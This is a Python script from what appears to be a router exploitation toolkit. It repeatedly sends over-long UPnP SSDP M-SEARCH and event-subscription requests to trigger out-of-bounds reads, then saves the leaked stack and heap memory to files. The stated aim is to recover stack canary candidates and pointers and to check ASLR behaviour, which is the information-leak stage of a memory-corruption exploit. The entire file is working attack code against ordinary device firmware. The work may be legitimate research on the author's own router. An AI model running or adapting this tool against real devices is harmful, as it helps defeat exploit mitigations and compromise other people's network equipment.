#!/usr/bin/env python3
"""
Leak harvester for OOB-02 (stack, SSDP) and OOB-03 (heap, event NOTIFY). Python 3, stdlib only.

Collects the bytes the router sends BEYOND its buffers, many times, and saves them
as raw files so leak_analyze.py can look for useful content (canary candidates,
pointers, strings, ASLR behaviour). It sends only the same kind of requests as
ssdp01_real_router_test.py / evt01_real_router_test.py. No setting is changed.

  OOB-02 sample = reply[512:]   (reply to an M-SEARCH with a long ST)
  OOB-03 sample = notify[1024:] (NOTIFY sent to a callback with a long path)

USAGE (PowerShell, PC on the router's LAN; keep this folder together):
  python leak_harvest.py 192.168.0.1 --label boot1
  python leak_harvest.py 192.168.0.1 --label boot1 --n 20 --only ssdp
  python leak_harvest.py 192.168.0.1 --label after_login --pc-ip 192.168.0.8

--label   name of this router state (e.g. boot1, boot1_after_wifi_change, boot2 = after a reboot).
          Take at least two labels in the SAME boot and one after a REBOOT; that tells
          whether addresses are randomized.
--n       samples per kind (default 10; 20 is plenty). Spacing is 0.5 s.
--only    ssdp | event   (default both)

Output: leak_samples/<label>/ssdp_###.bin and event_###.bin  (PRIVATE: router memory)
"""
import argparse
import os
import socket
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("router")
    ap.add_argument("--label", required=True)
    ap.add_argument("--n", type=int, default=10)
    ap.add_argument("--only", choices=["ssdp", "event"])
    ap.add_argument("--pc-ip")
    ap.add_argument("--suffix", type=int, default=1200, help="SSDP ST suffix length (default 1200)")
    ap.add_argument("--path", type=int, default=1200, help="event callback path length (default 1200)")
    a = ap.parse_args()

    outdir = os.path.join(HERE, "leak_samples", a.label)
    os.makedirs(outdir, exist_ok=True)

    if a.only in (None, "ssdp"):
        sys.argv = [sys.argv[0], a.router]
        import ssdp01_real_router_test as ss
        ss.ROUTER = a.router
        st = ss.BASE_ST + "B" * a.suffix
        ok = 0
        for i in range(a.n):
            r = ss.ask(st)
            if r is None:
                print(f"ssdp {i:03d}: no reply")
            elif len(r) <= 512:
                print(f"ssdp {i:03d}: reply {len(r)} bytes, not over-long")
            else:
                with open(os.path.join(outdir, f"ssdp_{i:03d}.bin"), "wb") as f:
                    f.write(r[512:])
                ok += 1
                print(f"ssdp {i:03d}: saved {len(r) - 512} bytes")
            time.sleep(0.5)
        print(f"SSDP: {ok}/{a.n} samples saved\n")

    if a.only in (None, "event"):
        sys.argv = [sys.argv[0], a.router] + ([a.pc_ip] if a.pc_ip else [])
        import evt01_real_router_test as ev
        ev.ROUTER = a.router
        port = ev.discover()
        if not port:
            print("No UPnP router answered SSDP; skipping event samples.")
        else:
            ip = ev.my_ip()
            ok = 0
            for i in range(a.n):
                cb = f"http://{ip}:{ev.LPORT}/" + "P" * a.path
                _, data = ev.run_case(port, ip, f"H{i}", cb)
                if len(data) <= 1024:
                    print(f"event {i:03d}: NOTIFY {len(data)} bytes, not over-long")
                else:
                    with open(os.path.join(outdir, f"event_{i:03d}.bin"), "wb") as f:
                        f.write(data[1024:])
                    ok += 1
                    print(f"event {i:03d}: saved {len(data) - 1024} bytes")
                time.sleep(0.5)
            print(f"EVENT: {ok}/{a.n} samples saved\n")

    print(f"Saved under {outdir}. Next: python leak_analyze.py")
    print("These files contain router memory. Keep them private.")


if __name__ == "__main__":
    main()
